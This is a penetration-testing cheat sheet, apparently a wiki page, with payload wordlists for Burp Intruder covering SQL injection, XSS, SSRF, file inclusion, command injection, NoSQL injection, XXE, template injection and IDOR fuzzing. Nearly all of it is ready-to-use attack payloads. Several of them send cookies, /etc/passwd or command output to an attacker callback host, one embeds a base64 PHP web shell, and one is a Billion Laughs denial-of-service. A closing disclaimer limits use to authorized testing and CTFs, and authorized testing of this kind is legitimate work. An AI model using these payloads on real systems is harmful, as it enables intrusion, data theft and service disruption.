# Burp Intruder Fast Check

**Placeholders Used:**

* `{{TARGET_HOST}}`: The target domain or IP.
* `{{CALLBACK_URL}}`: Your Burp Collaborator client URL or personal server for OAST (Out-of-Band Application Security Testing).
* `{{TARGET_FILE}}`: A file you are trying to read (e.g., /etc/passwd).
* `{{CMD}}`: A command you are trying to execute (e.g., whoami).
* `{{INJECT_POINT}}`: A marker for where the payload is injected.

***

#### **How to Use This in Burp Intruder**

1. **Attack Type:** Choose the appropriate attack type. "Sniper" is for a single position, while "Cluster Bomb" is excellent for testing multiple parameters at once (e.g., a username and password field with NoSQLi payloads).
2. **Payload Sets:** Load the relevant section below as a "Simple list".
3. **Placeholders:** Before running, use Intruder's "Find and Replace" feature in the main request window to replace placeholders like \{{CALLBACK\_URL\}} with your actual Collaborator URL.
4. **Payload Processing:** Use Intruder's "Payload Processing" rules to apply URL encoding, Base64 encoding, or other modifications on the fly. This is extremely powerful.
5. **Grep - Match:** Configure "Grep - Match" to look for success indicators, such as root:x:0:0, OAST\_SUCCESS, Content-Type: application/json, or specific error messages.
6. **Grep - Extract:** Use "Grep - Extract" to pull data from responses, which is ideal for blind vulnerabilities.

***

#### **Web Bolt Wordlist**

**1. SQL Injection (SQLi)**

code Codedownloadcontent\_copyexpand\_less

```
# === Boolean-Based ===
' OR 1=1--
" OR 1=1--
' OR '1'='1--
" OR "1"="1--
') OR ('1'='1--
1' OR '1'='1'
' OR 'x'='x
' OR 1 -- -
' OR '1'='1' /*
' OR 1=1#

# === Error-Based ===
' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT DATABASE()), 0x7e, FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
" AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT USER()), 0x7e, FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
' AND GTID_SUBSET(SHOW,1)--
' AND 1=(SELECT * FROM (SELECT NAME_CONST(VERSION(),1),NAME_CONST(VERSION(),1)) AS x)--
' anD 1=CoNvErT(iNt, (sElEcT User()))--

# === Time-Based (Blind) ===
' OR SLEEP(5)--
" OR SLEEP(5)--
' OR pg_sleep(5)--
" OR pg_sleep(5)--
' AND 1=IF(1=1,SLEEP(5),0)--
' OR BENCHMARK(5000000,MD5('a'))--
' OR 1=(SELECT 1 FROM PG_SLEEP(5))--

# === UNION-Based ===
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,@@VERSION,3--
' UNION SELECT 1,user(),3--
' UNION SELECT 1,table_name,column_name FROM information_schema.columns--
-1' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata--

# === Out-of-Band (OAST) ===
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT DATABASE()), '.{{CALLBACK_URL}}\\a'))--
' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS('{{CALLBACK_URL}}') FROM DUAL) IS NULL--
' AND (SELECT UTL_HTTP.REQUEST('http://{{CALLBACK_URL}}') FROM DUAL) IS NULL--
  
```

**2. Cross-Site Scripting (XSS)**

code Codedownloadcontent\_copyexpand\_less

```
# === Basic Payloads ===
"><script>alert(document.domain)</script>
'><script>alert(document.cookie)</script>
<script>fetch('//{{CALLBACK_URL}}?c='+btoa(document.cookie))</script>

# === HTML Tag & Event Handler Payloads ===
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<details/open/ontoggle=alert(1)>
<iframe src="javascript:alert('XSS')">
<img src="x:x" onerror="window.location='https://{{CALLBACK_URL}}/'+document.cookie">
<video><source onerror="alert(1)">
<math><maction actiontype="toggle" xlink:href="javascript:alert(1)">CLICKME</maction></math>
<a href="javascript:alert(1)">Click Me</a>

# === Polyglot Payloads (Work in multiple contexts) ===
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
'">><marquee><img src=x onerror=alert(1)></marquee>
`"'><img src=x onerror=alert(1)>
-->">'>"><img src=x onerror=alert(1)>

# === Encoded & Bypass Payloads ===
%3cscript%3ealert(1)%3c/script%3e
&lt;script&gt;alert(1)&lt;/script&gt;
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src="/" ="" onerror=alert(1)>
<sCrIpT sRc=//{{CALLBACK_URL}}></sCrIpT>
  
```

**3. Server-Side Request Forgery (SSRF)**

code Codedownloadcontent\_copyexpand\_less

```
# === Internal Hosts & IPs ===
http://127.0.0.1
http://localhost
http://[::1]
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
http://10.0.0.1
http://192.168.1.1
http://metadata.google.internal/computeMetadata/v1/instance/
http://169.254.169.254/latest/meta-data/
http://instance-data/latest/meta-data/

# === Protocol Wrappers & Bypasses ===
file:///etc/passwd
file:///c:/windows/win.ini
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
http://127.1/
http://0/
http://[0:0:0:0:0:ffff:127.0.0.1]/
http://[::]
http://0000::1
http://2130706433/ (127.0.0.1 in decimal)
http://0x7f000001/ (127.0.0.1 in hex)
http://{{TARGET_HOST}}@{{CALLBACK_URL}}/
http://{{CALLBACK_URL}}#{{TARGET_HOST}}/
  
```

**4. Remote & Local File Inclusion (RFI/LFI)**

code Codedownloadcontent\_copyexpand\_less

```
# === LFI Payloads ===
../../../../../../../../etc/passwd
../../../../../../../../etc/hosts
../../../../../../../../windows/win.ini
/var/log/apache2/access.log
/var/log/nginx/access.log
/proc/self/environ
/proc/self/cmdline
/etc/shadow
C:\boot.ini

# === Wrappers & Encoding Bypasses (PHP) ===
php://filter/convert.base64-encode/resource={{TARGET_FILE}}
php://filter/read=string.rot13/resource={{TARGET_FILE}}
php://input
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
zip://./archive.zip#shell.php
expect://{{CMD}}

# === Traversal Bypasses ===
....//....//....//....//etc/passwd
..%2f..%2f..%2f..%2fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
../../../../etc/passwd%00

# === RFI Payloads ===
http://{{CALLBACK_URL}}/shell.txt
https://{{CALLBACK_URL}}/shell.txt
//{{CALLBACK_URL}}/shell.txt
  
```

**5. Command Injection / RCE**

code Codedownloadcontent\_copyexpand\_less

```
# === Linux Payloads ===
; {{CMD}}
| {{CMD}}
`{{CMD}}`
$({{CMD}})
&& {{CMD}}
|| {{CMD}}
; ls -la;
; cat /etc/passwd;
; id;
; uname -a;
; ping -c 4 {{CALLBACK_URL}};
; curl http://{{CALLBACK_URL}}/?data=$(whoami);
; wget http://{{CALLBACK_URL}}/?data=$(cat /etc/passwd|base64);

# === Windows Payloads ===
& {{CMD}}
&& {{CMD}}
| {{CMD}}
|| {{CMD}}
& whoami
& type C:\Windows\win.ini
& ping -n 4 {{CALLBACK_URL}}
& powershell -c "Invoke-WebRequest -Uri http://{{CALLBACK_URL}}/ -Method POST -Body (Get-Content C:\Users\Administrator\Desktop\flag.txt)"
  
```

**6. NoSQL Injection**

code Codedownloadcontent\_copyexpand\_less

```
# === General Payloads (often in JSON) ===
{"$ne": "nonexistent"}
{"$gt": ""}
{"$regex": ".*"}
' || '1'=='1
' && this.password.length > 0
{"username": {"$ne": null}, "password": {"$ne": null}}
{"$where": "sleep(5000)"}
{"$where": "this.username.startsWith('admin') && this.password.startsWith('p')"}

# === Context-specific examples ===
user[$ne]=foo
password[$gt]=
user[$regex]=^admin
  
```

**7. XML External Entity (XXE)**

code Codedownloadcontent\_copyexpand\_less

```
# === Basic File Read ===
<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>

# === OAST Exfiltration ===
<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://{{CALLBACK_URL}}/evil.dtd"> %remote;%int;%send;]>
<!-- On your evil.dtd server: -->
<!-- <!ENTITY % file SYSTEM "file:///etc/passwd"> -->
<!-- <!ENTITY % int "<!ENTITY % send SYSTEM 'http://{{CALLBACK_URL}}/?content=%file;'>"> -->

# === Parameter Entities ===
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://{{CALLBACK_URL}}"> %xxe; ]>

# === Billion Laughs (DoS) ===
<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">...
  
```

**8. Server-Side Template Injection (SSTI)**

code Codedownloadcontent\_copyexpand\_less

```
# === Detection Payloads ===
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{self}}

# === RCE Payloads (Engine Specific) ===
# Jinja2 (Python)
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('{{CMD}}').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('{{CMD}}').read() }}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("{{CMD}}") }

# Velocity (Java)
#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($cm=$rt.getRuntime().exec('{{CMD}}'))
$cm.getInputStream()
  
```

**9. IDOR / BOLA (Fuzzing Payloads)**

This is more about technique. Use Intruder's "Numbers" payload type.

* **Endpoint:** /api/v1/users/{USER\_ID}/profile -> Fuzz USER\_ID from 1 to 1000.
* **Endpoint:** /api/v1/admin/users/1 -> Fuzz the path: change admin to user, manager, support.
* **Payloads for Roles/IDs:**
  * admin
  * administrator
  * root
  * guest
  * test
  * user1
  * UUIDs (If you find one, slightly alter it to see if you can access another).
  * 1,2,3...1000 (Number fuzzing)

***

**Disclaimer:** This list is provided for educational purposes and for use in legal, authorized security testing environments such as Capture The Flag (CTF) events and professional penetration tests with explicit, written consent from the target organization.&#x20;

{% hint style="warning" %}
Unauthorized use of these payloads against systems you do not own or have permission to test is illegal and unethical.&#x20;
{% endhint %}

Always operate within the law and follow ethical guidelines.
